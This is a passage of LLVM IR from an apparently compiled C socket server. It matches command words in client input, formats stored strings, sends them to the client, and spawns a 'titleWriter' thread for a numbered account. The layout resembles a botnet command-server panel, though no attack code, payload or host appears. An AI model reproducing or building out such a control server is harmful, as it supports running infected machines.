  %1485 = call i64 @send(i32 %1481, i8* %1482, i64 %1484, i32 16384)
  %1486 = icmp eq i64 %1485, -1
  br i1 %1486, label %1487, label %1488

1487:                                             ; preds = %1480
  br label %2807

1488:                                             ; preds = %1480
  %1489 = load i32, i32* %4, align 4
  %1490 = getelementptr inbounds [5000 x i8], [5000 x i8]* %114, i64 0, i64 0
  %1491 = getelementptr inbounds [5000 x i8], [5000 x i8]* %114, i64 0, i64 0
  %1492 = call i64 @strlen(i8* %1491) #9
  %1493 = call i64 @send(i32 %1489, i8* %1490, i64 %1492, i32 16384)
  %1494 = icmp eq i64 %1493, -1
  br i1 %1494, label %1495, label %1496

1495:                                             ; preds = %1488
  br label %2807

1496:                                             ; preds = %1488
  %1497 = load i32, i32* %4, align 4
  %1498 = getelementptr inbounds [5000 x i8], [5000 x i8]* %115, i64 0, i64 0
  %1499 = getelementptr inbounds [5000 x i8], [5000 x i8]* %115, i64 0, i64 0
  %1500 = call i64 @strlen(i8* %1499) #9
  %1501 = call i64 @send(i32 %1497, i8* %1498, i64 %1500, i32 16384)
  %1502 = icmp eq i64 %1501, -1
  br i1 %1502, label %1503, label %1504

1503:                                             ; preds = %1496
  br label %2807

1504:                                             ; preds = %1496
  %1505 = load i32, i32* %4, align 4
  %1506 = getelementptr inbounds [5000 x i8], [5000 x i8]* %116, i64 0, i64 0
  %1507 = getelementptr inbounds [5000 x i8], [5000 x i8]* %116, i64 0, i64 0
  %1508 = call i64 @strlen(i8* %1507) #9
  %1509 = call i64 @send(i32 %1505, i8* %1506, i64 %1508, i32 16384)
  %1510 = icmp eq i64 %1509, -1
  br i1 %1510, label %1511, label %1512

1511:                                             ; preds = %1504
  br label %2807

1512:                                             ; preds = %1504
  %1513 = load i8*, i8** %3, align 8
  %1514 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1513) #8
  br label %1515

1515:                                             ; preds = %1512
  %1516 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1517 = load i32, i32* %5, align 4
  %1518 = sext i32 %1517 to i64
  %1519 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %1518
  %1520 = getelementptr inbounds %struct.account, %struct.account* %1519, i32 0, i32 0
  %1521 = getelementptr inbounds [200 x i8], [200 x i8]* %1520, i64 0, i64 0
  %1522 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1523 = call i32 (i8*, i8*, ...) @sprintf(i8* %1516, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.40, i64 0, i64 0), i8* %1521, i8* %1522) #8
  %1524 = load i32, i32* %4, align 4
  %1525 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1526 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1527 = call i64 @strlen(i8* %1526) #9
  %1528 = call i64 @send(i32 %1524, i8* %1525, i64 %1527, i32 16384)
  %1529 = icmp eq i64 %1528, -1
  br i1 %1529, label %1530, label %1531

1530:                                             ; preds = %1515
  br label %2807

1531:                                             ; preds = %1515
  br label %1532

1532:                                             ; preds = %1531
  br label %426, !llvm.loop !26

1533:                                             ; preds = %1375
  %1534 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1535 = call i8* @strstr(i8* %1534, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.133, i64 0, i64 0)) #9
  %1536 = icmp ne i8* %1535, null
  br i1 %1536, label %1537, label %1641

1537:                                             ; preds = %1533
  br label %1538

1538:                                             ; preds = %1537
  %1539 = load i8*, i8** %3, align 8
  %1540 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1539) #8
  %1541 = getelementptr inbounds [5000 x i8], [5000 x i8]* %117, i64 0, i64 0
  %1542 = call i32 (i8*, i8*, ...) @sprintf(i8* %1541, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.134, i64 0, i64 0)) #8
  %1543 = getelementptr inbounds [5000 x i8], [5000 x i8]* %118, i64 0, i64 0
  %1544 = call i32 (i8*, i8*, ...) @sprintf(i8* %1543, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.69, i64 0, i64 0)) #8
  %1545 = getelementptr inbounds [5000 x i8], [5000 x i8]* %119, i64 0, i64 0
  %1546 = call i32 (i8*, i8*, ...) @sprintf(i8* %1545, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.135, i64 0, i64 0)) #8
  %1547 = getelementptr inbounds [5000 x i8], [5000 x i8]* %120, i64 0, i64 0
  %1548 = call i32 (i8*, i8*, ...) @sprintf(i8* %1547, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.136, i64 0, i64 0)) #8
  %1549 = getelementptr inbounds [5000 x i8], [5000 x i8]* %121, i64 0, i64 0
  %1550 = call i32 (i8*, i8*, ...) @sprintf(i8* %1549, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.137, i64 0, i64 0)) #8
  %1551 = getelementptr inbounds [5000 x i8], [5000 x i8]* %122, i64 0, i64 0
  %1552 = call i32 (i8*, i8*, ...) @sprintf(i8* %1551, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.138, i64 0, i64 0)) #8
  %1553 = getelementptr inbounds [5000 x i8], [5000 x i8]* %123, i64 0, i64 0
  %1554 = call i32 (i8*, i8*, ...) @sprintf(i8* %1553, i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.139, i64 0, i64 0)) #8
  %1555 = getelementptr inbounds [5000 x i8], [5000 x i8]* %124, i64 0, i64 0
  %1556 = call i32 (i8*, i8*, ...) @sprintf(i8* %1555, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.69, i64 0, i64 0)) #8
  %1557 = load i32, i32* %4, align 4
  %1558 = getelementptr inbounds [5000 x i8], [5000 x i8]* %117, i64 0, i64 0
  %1559 = getelementptr inbounds [5000 x i8], [5000 x i8]* %117, i64 0, i64 0
  %1560 = call i64 @strlen(i8* %1559) #9
  %1561 = call i64 @send(i32 %1557, i8* %1558, i64 %1560, i32 16384)
  %1562 = icmp eq i64 %1561, -1
  br i1 %1562, label %1563, label %1564

1563:                                             ; preds = %1538
  br label %2807

1564:                                             ; preds = %1538
  %1565 = load i32, i32* %4, align 4
  %1566 = getelementptr inbounds [5000 x i8], [5000 x i8]* %118, i64 0, i64 0
  %1567 = getelementptr inbounds [5000 x i8], [5000 x i8]* %118, i64 0, i64 0
  %1568 = call i64 @strlen(i8* %1567) #9
  %1569 = call i64 @send(i32 %1565, i8* %1566, i64 %1568, i32 16384)
  %1570 = icmp eq i64 %1569, -1
  br i1 %1570, label %1571, label %1572

1571:                                             ; preds = %1564
  br label %2807

1572:                                             ; preds = %1564
  %1573 = load i32, i32* %4, align 4
  %1574 = getelementptr inbounds [5000 x i8], [5000 x i8]* %119, i64 0, i64 0
  %1575 = getelementptr inbounds [5000 x i8], [5000 x i8]* %119, i64 0, i64 0
  %1576 = call i64 @strlen(i8* %1575) #9
  %1577 = call i64 @send(i32 %1573, i8* %1574, i64 %1576, i32 16384)
  %1578 = icmp eq i64 %1577, -1
  br i1 %1578, label %1579, label %1580

1579:                                             ; preds = %1572
  br label %2807

1580:                                             ; preds = %1572
  %1581 = load i32, i32* %4, align 4
  %1582 = getelementptr inbounds [5000 x i8], [5000 x i8]* %120, i64 0, i64 0
  %1583 = getelementptr inbounds [5000 x i8], [5000 x i8]* %120, i64 0, i64 0
  %1584 = call i64 @strlen(i8* %1583) #9
  %1585 = call i64 @send(i32 %1581, i8* %1582, i64 %1584, i32 16384)
  %1586 = icmp eq i64 %1585, -1
  br i1 %1586, label %1587, label %1588

1587:                                             ; preds = %1580
  br label %2807

1588:                                             ; preds = %1580
  %1589 = load i32, i32* %4, align 4
  %1590 = getelementptr inbounds [5000 x i8], [5000 x i8]* %121, i64 0, i64 0
  %1591 = getelementptr inbounds [5000 x i8], [5000 x i8]* %121, i64 0, i64 0
  %1592 = call i64 @strlen(i8* %1591) #9
  %1593 = call i64 @send(i32 %1589, i8* %1590, i64 %1592, i32 16384)
  %1594 = icmp eq i64 %1593, -1
  br i1 %1594, label %1595, label %1596

1595:                                             ; preds = %1588
  br label %2807

1596:                                             ; preds = %1588
  %1597 = load i32, i32* %4, align 4
  %1598 = getelementptr inbounds [5000 x i8], [5000 x i8]* %122, i64 0, i64 0
  %1599 = getelementptr inbounds [5000 x i8], [5000 x i8]* %122, i64 0, i64 0
  %1600 = call i64 @strlen(i8* %1599) #9
  %1601 = call i64 @send(i32 %1597, i8* %1598, i64 %1600, i32 16384)
  %1602 = icmp eq i64 %1601, -1
  br i1 %1602, label %1603, label %1604

1603:                                             ; preds = %1596
  br label %2807

1604:                                             ; preds = %1596
  %1605 = load i32, i32* %4, align 4
  %1606 = getelementptr inbounds [5000 x i8], [5000 x i8]* %123, i64 0, i64 0
  %1607 = getelementptr inbounds [5000 x i8], [5000 x i8]* %123, i64 0, i64 0
  %1608 = call i64 @strlen(i8* %1607) #9
  %1609 = call i64 @send(i32 %1605, i8* %1606, i64 %1608, i32 16384)
  %1610 = icmp eq i64 %1609, -1
  br i1 %1610, label %1611, label %1612

1611:                                             ; preds = %1604
  br label %2807

1612:                                             ; preds = %1604
  %1613 = load i32, i32* %4, align 4
  %1614 = getelementptr inbounds [5000 x i8], [5000 x i8]* %124, i64 0, i64 0
  %1615 = getelementptr inbounds [5000 x i8], [5000 x i8]* %124, i64 0, i64 0
  %1616 = call i64 @strlen(i8* %1615) #9
  %1617 = call i64 @send(i32 %1613, i8* %1614, i64 %1616, i32 16384)
  %1618 = icmp eq i64 %1617, -1
  br i1 %1618, label %1619, label %1620

1619:                                             ; preds = %1612
  br label %2807

1620:                                             ; preds = %1612
  %1621 = load i8*, i8** %3, align 8
  %1622 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1621) #8
  br label %1623

1623:                                             ; preds = %1620
  %1624 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1625 = load i32, i32* %5, align 4
  %1626 = sext i32 %1625 to i64
  %1627 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %1626
  %1628 = getelementptr inbounds %struct.account, %struct.account* %1627, i32 0, i32 0
  %1629 = getelementptr inbounds [200 x i8], [200 x i8]* %1628, i64 0, i64 0
  %1630 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1631 = call i32 (i8*, i8*, ...) @sprintf(i8* %1624, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.40, i64 0, i64 0), i8* %1629, i8* %1630) #8
  %1632 = load i32, i32* %4, align 4
  %1633 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1634 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1635 = call i64 @strlen(i8* %1634) #9
  %1636 = call i64 @send(i32 %1632, i8* %1633, i64 %1635, i32 16384)
  %1637 = icmp eq i64 %1636, -1
  br i1 %1637, label %1638, label %1639

1638:                                             ; preds = %1623
  br label %2807

1639:                                             ; preds = %1623
  br label %1640

1640:                                             ; preds = %1639
  br label %426, !llvm.loop !26

1641:                                             ; preds = %1533
  %1642 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1643 = call i8* @strstr(i8* %1642, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.140, i64 0, i64 0)) #9
  %1644 = icmp ne i8* %1643, null
  br i1 %1644, label %1645, label %1779

1645:                                             ; preds = %1641
  br label %1646

1646:                                             ; preds = %1645
  %1647 = load i8*, i8** %3, align 8
  %1648 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1647) #8
  %1649 = getelementptr inbounds [5000 x i8], [5000 x i8]* %125, i64 0, i64 0
  %1650 = call i32 (i8*, i8*, ...) @sprintf(i8* %1649, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.141, i64 0, i64 0)) #8
  %1651 = getelementptr inbounds [5000 x i8], [5000 x i8]* %126, i64 0, i64 0
  %1652 = call i32 (i8*, i8*, ...) @sprintf(i8* %1651, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.69, i64 0, i64 0)) #8
  %1653 = getelementptr inbounds [5000 x i8], [5000 x i8]* %127, i64 0, i64 0
  %1654 = call i32 (i8*, i8*, ...) @sprintf(i8* %1653, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.142, i64 0, i64 0)) #8
  %1655 = getelementptr inbounds [5000 x i8], [5000 x i8]* %128, i64 0, i64 0
  %1656 = call i32 (i8*, i8*, ...) @sprintf(i8* %1655, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.143, i64 0, i64 0)) #8
  %1657 = getelementptr inbounds [5000 x i8], [5000 x i8]* %129, i64 0, i64 0
  %1658 = call i32 (i8*, i8*, ...) @sprintf(i8* %1657, i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.144, i64 0, i64 0)) #8
  %1659 = getelementptr inbounds [5000 x i8], [5000 x i8]* %130, i64 0, i64 0
  %1660 = call i32 (i8*, i8*, ...) @sprintf(i8* %1659, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.145, i64 0, i64 0)) #8
  %1661 = getelementptr inbounds [5000 x i8], [5000 x i8]* %131, i64 0, i64 0
  %1662 = call i32 (i8*, i8*, ...) @sprintf(i8* %1661, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.146, i64 0, i64 0)) #8
  %1663 = getelementptr inbounds [5000 x i8], [5000 x i8]* %132, i64 0, i64 0
  %1664 = call i32 (i8*, i8*, ...) @sprintf(i8* %1663, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.147, i64 0, i64 0)) #8
  %1665 = getelementptr inbounds [5000 x i8], [5000 x i8]* %133, i64 0, i64 0
  %1666 = call i32 (i8*, i8*, ...) @sprintf(i8* %1665, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.148, i64 0, i64 0)) #8
  %1667 = getelementptr inbounds [5000 x i8], [5000 x i8]* %134, i64 0, i64 0
  %1668 = call i32 (i8*, i8*, ...) @sprintf(i8* %1667, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.149, i64 0, i64 0)) #8
  %1669 = getelementptr inbounds [5000 x i8], [5000 x i8]* %135, i64 0, i64 0
  %1670 = call i32 (i8*, i8*, ...) @sprintf(i8* %1669, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.69, i64 0, i64 0)) #8
  %1671 = load i32, i32* %4, align 4
  %1672 = getelementptr inbounds [5000 x i8], [5000 x i8]* %125, i64 0, i64 0
  %1673 = getelementptr inbounds [5000 x i8], [5000 x i8]* %125, i64 0, i64 0
  %1674 = call i64 @strlen(i8* %1673) #9
  %1675 = call i64 @send(i32 %1671, i8* %1672, i64 %1674, i32 16384)
  %1676 = icmp eq i64 %1675, -1
  br i1 %1676, label %1677, label %1678

1677:                                             ; preds = %1646
  br label %2807

1678:                                             ; preds = %1646
  %1679 = load i32, i32* %4, align 4
  %1680 = getelementptr inbounds [5000 x i8], [5000 x i8]* %126, i64 0, i64 0
  %1681 = getelementptr inbounds [5000 x i8], [5000 x i8]* %126, i64 0, i64 0
  %1682 = call i64 @strlen(i8* %1681) #9
  %1683 = call i64 @send(i32 %1679, i8* %1680, i64 %1682, i32 16384)
  %1684 = icmp eq i64 %1683, -1
  br i1 %1684, label %1685, label %1686

1685:                                             ; preds = %1678
  br label %2807

1686:                                             ; preds = %1678
  %1687 = load i32, i32* %4, align 4
  %1688 = getelementptr inbounds [5000 x i8], [5000 x i8]* %127, i64 0, i64 0
  %1689 = getelementptr inbounds [5000 x i8], [5000 x i8]* %127, i64 0, i64 0
  %1690 = call i64 @strlen(i8* %1689) #9
  %1691 = call i64 @send(i32 %1687, i8* %1688, i64 %1690, i32 16384)
  %1692 = icmp eq i64 %1691, -1
  br i1 %1692, label %1693, label %1694

1693:                                             ; preds = %1686
  br label %2807

1694:                                             ; preds = %1686
  %1695 = load i32, i32* %4, align 4
  %1696 = getelementptr inbounds [5000 x i8], [5000 x i8]* %128, i64 0, i64 0
  %1697 = getelementptr inbounds [5000 x i8], [5000 x i8]* %128, i64 0, i64 0
  %1698 = call i64 @strlen(i8* %1697) #9
  %1699 = call i64 @send(i32 %1695, i8* %1696, i64 %1698, i32 16384)
  %1700 = icmp eq i64 %1699, -1
  br i1 %1700, label %1701, label %1702

1701:                                             ; preds = %1694
  br label %2807

1702:                                             ; preds = %1694
  %1703 = load i32, i32* %4, align 4
  %1704 = getelementptr inbounds [5000 x i8], [5000 x i8]* %129, i64 0, i64 0
  %1705 = getelementptr inbounds [5000 x i8], [5000 x i8]* %129, i64 0, i64 0
  %1706 = call i64 @strlen(i8* %1705) #9
  %1707 = call i64 @send(i32 %1703, i8* %1704, i64 %1706, i32 16384)
  %1708 = icmp eq i64 %1707, -1
  br i1 %1708, label %1709, label %1710

1709:                                             ; preds = %1702
  br label %2807

1710:                                             ; preds = %1702
  %1711 = load i32, i32* %4, align 4
  %1712 = getelementptr inbounds [5000 x i8], [5000 x i8]* %130, i64 0, i64 0
  %1713 = getelementptr inbounds [5000 x i8], [5000 x i8]* %130, i64 0, i64 0
  %1714 = call i64 @strlen(i8* %1713) #9
  %1715 = call i64 @send(i32 %1711, i8* %1712, i64 %1714, i32 16384)
  %1716 = icmp eq i64 %1715, -1
  br i1 %1716, label %1717, label %1718

1717:                                             ; preds = %1710
  br label %2807

1718:                                             ; preds = %1710
  %1719 = load i32, i32* %4, align 4
  %1720 = getelementptr inbounds [5000 x i8], [5000 x i8]* %131, i64 0, i64 0
  %1721 = getelementptr inbounds [5000 x i8], [5000 x i8]* %131, i64 0, i64 0
  %1722 = call i64 @strlen(i8* %1721) #9
  %1723 = call i64 @send(i32 %1719, i8* %1720, i64 %1722, i32 16384)
  %1724 = icmp eq i64 %1723, -1
  br i1 %1724, label %1725, label %1726

1725:                                             ; preds = %1718
  br label %2807

1726:                                             ; preds = %1718
  %1727 = load i32, i32* %4, align 4
  %1728 = getelementptr inbounds [5000 x i8], [5000 x i8]* %132, i64 0, i64 0
  %1729 = getelementptr inbounds [5000 x i8], [5000 x i8]* %132, i64 0, i64 0
  %1730 = call i64 @strlen(i8* %1729) #9
  %1731 = call i64 @send(i32 %1727, i8* %1728, i64 %1730, i32 16384)
  %1732 = icmp eq i64 %1731, -1
  br i1 %1732, label %1733, label %1734

1733:                                             ; preds = %1726
  br label %2807

1734:                                             ; preds = %1726
  %1735 = load i32, i32* %4, align 4
  %1736 = getelementptr inbounds [5000 x i8], [5000 x i8]* %133, i64 0, i64 0
  %1737 = getelementptr inbounds [5000 x i8], [5000 x i8]* %133, i64 0, i64 0
  %1738 = call i64 @strlen(i8* %1737) #9
  %1739 = call i64 @send(i32 %1735, i8* %1736, i64 %1738, i32 16384)
  %1740 = icmp eq i64 %1739, -1
  br i1 %1740, label %1741, label %1742

1741:                                             ; preds = %1734
  br label %2807

1742:                                             ; preds = %1734
  %1743 = load i32, i32* %4, align 4
  %1744 = getelementptr inbounds [5000 x i8], [5000 x i8]* %134, i64 0, i64 0
  %1745 = getelementptr inbounds [5000 x i8], [5000 x i8]* %134, i64 0, i64 0
  %1746 = call i64 @strlen(i8* %1745) #9
  %1747 = call i64 @send(i32 %1743, i8* %1744, i64 %1746, i32 16384)
  %1748 = icmp eq i64 %1747, -1
  br i1 %1748, label %1749, label %1750

1749:                                             ; preds = %1742
  br label %2807

1750:                                             ; preds = %1742
  %1751 = load i32, i32* %4, align 4
  %1752 = getelementptr inbounds [5000 x i8], [5000 x i8]* %135, i64 0, i64 0
  %1753 = getelementptr inbounds [5000 x i8], [5000 x i8]* %135, i64 0, i64 0
  %1754 = call i64 @strlen(i8* %1753) #9
  %1755 = call i64 @send(i32 %1751, i8* %1752, i64 %1754, i32 16384)
  %1756 = icmp eq i64 %1755, -1
  br i1 %1756, label %1757, label %1758

1757:                                             ; preds = %1750
  br label %2807

1758:                                             ; preds = %1750
  %1759 = load i8*, i8** %3, align 8
  %1760 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1759) #8
  br label %1761

1761:                                             ; preds = %1758
  %1762 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1763 = load i32, i32* %5, align 4
  %1764 = sext i32 %1763 to i64
  %1765 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %1764
  %1766 = getelementptr inbounds %struct.account, %struct.account* %1765, i32 0, i32 0
  %1767 = getelementptr inbounds [200 x i8], [200 x i8]* %1766, i64 0, i64 0
  %1768 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1769 = call i32 (i8*, i8*, ...) @sprintf(i8* %1762, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.40, i64 0, i64 0), i8* %1767, i8* %1768) #8
  %1770 = load i32, i32* %4, align 4
  %1771 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1772 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %1773 = call i64 @strlen(i8* %1772) #9
  %1774 = call i64 @send(i32 %1770, i8* %1771, i64 %1773, i32 16384)
  %1775 = icmp eq i64 %1774, -1
  br i1 %1775, label %1776, label %1777

1776:                                             ; preds = %1761
  br label %2807

1777:                                             ; preds = %1761
  br label %1778

1778:                                             ; preds = %1777
  br label %426, !llvm.loop !26

1779:                                             ; preds = %1641
  %1780 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1781 = call i8* @strstr(i8* %1780, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.150, i64 0, i64 0)) #9
  %1782 = icmp ne i8* %1781, null
  br i1 %1782, label %1791, label %1783

1783:                                             ; preds = %1779
  %1784 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1785 = call i8* @strstr(i8* %1784, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.151, i64 0, i64 0)) #9
  %1786 = icmp ne i8* %1785, null
  br i1 %1786, label %1791, label %1787

1787:                                             ; preds = %1783
  %1788 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %1789 = call i8* @strstr(i8* %1788, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.152, i64 0, i64 0)) #9
  %1790 = icmp ne i8* %1789, null
  br i1 %1790, label %1791, label %2044

1791:                                             ; preds = %1787, %1783, %1779
  %1792 = load i8*, i8** %3, align 8
  %1793 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1792) #8
  %1794 = getelementptr inbounds [5000 x i8], [5000 x i8]* %136, i64 0, i64 0
  %1795 = call i32 (i8*, i8*, ...) @sprintf(i8* %1794, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.153, i64 0, i64 0)) #8
  %1796 = getelementptr inbounds [5000 x i8], [5000 x i8]* %137, i64 0, i64 0
  %1797 = call i32 (i8*, i8*, ...) @sprintf(i8* %1796, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.69, i64 0, i64 0)) #8
  %1798 = getelementptr inbounds [5000 x i8], [5000 x i8]* %138, i64 0, i64 0
  %1799 = call i32 (i8*, i8*, ...) @sprintf(i8* %1798, i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.154, i64 0, i64 0)) #8
  %1800 = getelementptr inbounds [5000 x i8], [5000 x i8]* %139, i64 0, i64 0
  %1801 = call i32 (i8*, i8*, ...) @sprintf(i8* %1800, i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.155, i64 0, i64 0)) #8
  %1802 = getelementptr inbounds [5000 x i8], [5000 x i8]* %140, i64 0, i64 0
  %1803 = call i32 (i8*, i8*, ...) @sprintf(i8* %1802, i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.156, i64 0, i64 0)) #8
  %1804 = getelementptr inbounds [5000 x i8], [5000 x i8]* %141, i64 0, i64 0
  %1805 = call i32 (i8*, i8*, ...) @sprintf(i8* %1804, i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.157, i64 0, i64 0)) #8
  %1806 = getelementptr inbounds [5000 x i8], [5000 x i8]* %142, i64 0, i64 0
  %1807 = call i32 (i8*, i8*, ...) @sprintf(i8* %1806, i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.158, i64 0, i64 0)) #8
  %1808 = getelementptr inbounds [5000 x i8], [5000 x i8]* %143, i64 0, i64 0
  %1809 = call i32 (i8*, i8*, ...) @sprintf(i8* %1808, i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.159, i64 0, i64 0)) #8
  %1810 = getelementptr inbounds [5000 x i8], [5000 x i8]* %144, i64 0, i64 0
  %1811 = call i32 (i8*, i8*, ...) @sprintf(i8* %1810, i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.160, i64 0, i64 0)) #8
  %1812 = getelementptr inbounds [5000 x i8], [5000 x i8]* %145, i64 0, i64 0
  %1813 = call i32 (i8*, i8*, ...) @sprintf(i8* %1812, i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.161, i64 0, i64 0)) #8
  %1814 = getelementptr inbounds [5000 x i8], [5000 x i8]* %146, i64 0, i64 0
  %1815 = call i32 (i8*, i8*, ...) @sprintf(i8* %1814, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.162, i64 0, i64 0)) #8
  %1816 = getelementptr inbounds [5000 x i8], [5000 x i8]* %147, i64 0, i64 0
  %1817 = call i32 (i8*, i8*, ...) @sprintf(i8* %1816, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.163, i64 0, i64 0)) #8
  %1818 = getelementptr inbounds [5000 x i8], [5000 x i8]* %148, i64 0, i64 0
  %1819 = call i32 (i8*, i8*, ...) @sprintf(i8* %1818, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.69, i64 0, i64 0)) #8
  %1820 = getelementptr inbounds [5000 x i8], [5000 x i8]* %149, i64 0, i64 0
  %1821 = call i32 (i8*, i8*, ...) @sprintf(i8* %1820, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.164, i64 0, i64 0)) #8
  %1822 = getelementptr inbounds [5000 x i8], [5000 x i8]* %150, i64 0, i64 0
  %1823 = call i32 (i8*, i8*, ...) @sprintf(i8* %1822, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.165, i64 0, i64 0)) #8
  %1824 = getelementptr inbounds [5000 x i8], [5000 x i8]* %151, i64 0, i64 0
  %1825 = call i32 (i8*, i8*, ...) @sprintf(i8* %1824, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.166, i64 0, i64 0)) #8
  %1826 = getelementptr inbounds [5000 x i8], [5000 x i8]* %152, i64 0, i64 0
  %1827 = call i32 (i8*, i8*, ...) @sprintf(i8* %1826, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.167, i64 0, i64 0)) #8
  %1828 = getelementptr inbounds [5000 x i8], [5000 x i8]* %153, i64 0, i64 0
  %1829 = call i32 (i8*, i8*, ...) @sprintf(i8* %1828, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.168, i64 0, i64 0)) #8
  %1830 = getelementptr inbounds [5000 x i8], [5000 x i8]* %154, i64 0, i64 0
  %1831 = call i32 (i8*, i8*, ...) @sprintf(i8* %1830, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.169, i64 0, i64 0)) #8
  %1832 = getelementptr inbounds [5000 x i8], [5000 x i8]* %155, i64 0, i64 0
  %1833 = call i32 (i8*, i8*, ...) @sprintf(i8* %1832, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.170, i64 0, i64 0)) #8
  %1834 = getelementptr inbounds [5000 x i8], [5000 x i8]* %156, i64 0, i64 0
  %1835 = call i32 (i8*, i8*, ...) @sprintf(i8* %1834, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.171, i64 0, i64 0)) #8
  %1836 = getelementptr inbounds [5000 x i8], [5000 x i8]* %157, i64 0, i64 0
  %1837 = call i32 (i8*, i8*, ...) @sprintf(i8* %1836, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.172, i64 0, i64 0)) #8
  %1838 = getelementptr inbounds [5000 x i8], [5000 x i8]* %158, i64 0, i64 0
  %1839 = call i32 (i8*, i8*, ...) @sprintf(i8* %1838, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.69, i64 0, i64 0)) #8
  %1840 = load i32, i32* %4, align 4
  %1841 = getelementptr inbounds [5000 x i8], [5000 x i8]* %136, i64 0, i64 0
  %1842 = getelementptr inbounds [5000 x i8], [5000 x i8]* %136, i64 0, i64 0
  %1843 = call i64 @strlen(i8* %1842) #9
  %1844 = call i64 @send(i32 %1840, i8* %1841, i64 %1843, i32 16384)
  %1845 = icmp eq i64 %1844, -1
  br i1 %1845, label %1846, label %1847

1846:                                             ; preds = %1791
  br label %2807

1847:                                             ; preds = %1791
  %1848 = load i32, i32* %4, align 4
  %1849 = getelementptr inbounds [5000 x i8], [5000 x i8]* %137, i64 0, i64 0
  %1850 = getelementptr inbounds [5000 x i8], [5000 x i8]* %137, i64 0, i64 0
  %1851 = call i64 @strlen(i8* %1850) #9
  %1852 = call i64 @send(i32 %1848, i8* %1849, i64 %1851, i32 16384)
  %1853 = icmp eq i64 %1852, -1
